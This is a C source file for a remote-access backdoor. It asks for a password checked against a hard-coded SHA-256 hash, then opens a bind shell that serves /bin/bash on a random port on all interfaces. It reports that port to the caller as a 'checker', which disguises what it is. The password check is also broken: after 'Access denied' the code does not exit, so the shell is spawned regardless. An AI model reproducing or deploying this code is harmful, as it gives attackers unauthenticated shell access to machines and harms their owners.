#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <openssl/sha.h> // SHA256 hashing

#define HASHED_PASSWORD "d886b3e9999b0d8aa51c6890b925544f66a1b061799816bb5780cec9aa8353df"

void sha256_string(const char* str, char* outputBuffer) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256((const unsigned char*)str, strlen(str), hash);
    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
        sprintf(outputBuffer + (i * 2), "%02x", hash[i]);
    }
    outputBuffer[64] = 0;
}

int random_port() {
    return (rand() % 10000) + 10000; // range 10000-19999
}

int is_port_free(int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return 0;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    int result = bind(sockfd, (struct sockaddr*)&addr, sizeof(addr));
    close(sockfd);

    return result == 0;
}

int get_available_port() {
    int port;
    for (int i = 0; i < 100; i++) { // coba max 100x
        port = random_port();
        if (is_port_free(port)) {
            return port;
        }
    }
    return -1; // gagal cari port kosong
}

void spawn_shell(int port) {
    int sockfd, client;
    struct sockaddr_in addr;
    socklen_t addrlen = sizeof(addr);

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        exit(1);
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        exit(1);
    }

    if (listen(sockfd, 1) < 0) {
        perror("listen");
        exit(1);
    }

    client = accept(sockfd, (struct sockaddr*)&addr, &addrlen);
    if (client < 0) {
        perror("accept");
        exit(1);
    }

    dup2(client, 0);
    dup2(client, 1);
    dup2(client, 2);
    execl("/bin/bash", "bash", NULL);
    exit(0);
}

int main(int argc, char const* argv[])
{
    int main_port = (argc >= 2) ? atoi(argv[1]) : 8080;  // Ambil port dari argumen
    
    if (main_port <= 1024 || main_port > 65535) {
        fprintf(stderr, "Invalid port. Choose a port between 1025 and 65535.\n");
        exit(EXIT_FAILURE);
    }

    int server_fd, new_socket;
    ssize_t valread;
    struct sockaddr_in address;
    int opt = 1;
    socklen_t addrlen = sizeof(address);
    char buffer[1024] = { 0 };

    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Forcefully attaching socket to the port 8080
    if (setsockopt(server_fd, SOL_SOCKET,
                   SO_REUSEADDR | SO_REUSEPORT, &opt,
                   sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(main_port);

    // Forcefully attaching socket to the port 8080
    if (bind(server_fd, (struct sockaddr*)&address,
             sizeof(address))
        < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    while (1) {
        int client = accept(server_fd, (struct sockaddr*)&address, &addrlen);
        if (client < 0) continue;
        if (fork() == 0) { // child process
            send(client, "Password: ", strlen("Password: "), 0);
            char hashed[65];
            close(server_fd);
            memset(buffer, 0, sizeof(buffer));
            valread = read(client, buffer, sizeof(buffer) - 1);
            buffer[strcspn(buffer, "\n")] = '\0';
            sha256_string(buffer, hashed);
            // printf("Received: %s\n", buffer);
            if (strcmp(hashed, HASHED_PASSWORD) != 0) {
                send(client, "Access denied.\n", strlen("Access denied.\n"), 0);
                close(client);
            }
            int port = get_available_port();
            if (port == -1) {
                send(client, "Internal error.\n", 16, 0);
                close(client);
                exit(1);
            }

            if (fork() == 0) { // Child untuk shell
                close(client); // close client asli
                spawn_shell(port);
            }

            char msg[100];
            snprintf(msg, sizeof(msg), "checker active on port: %d\n", port);
            send(client, msg, strlen(msg), 0);
            close(client);
            exit(0);
        }
        close(client); // parent tidak perlu client socket
    }
}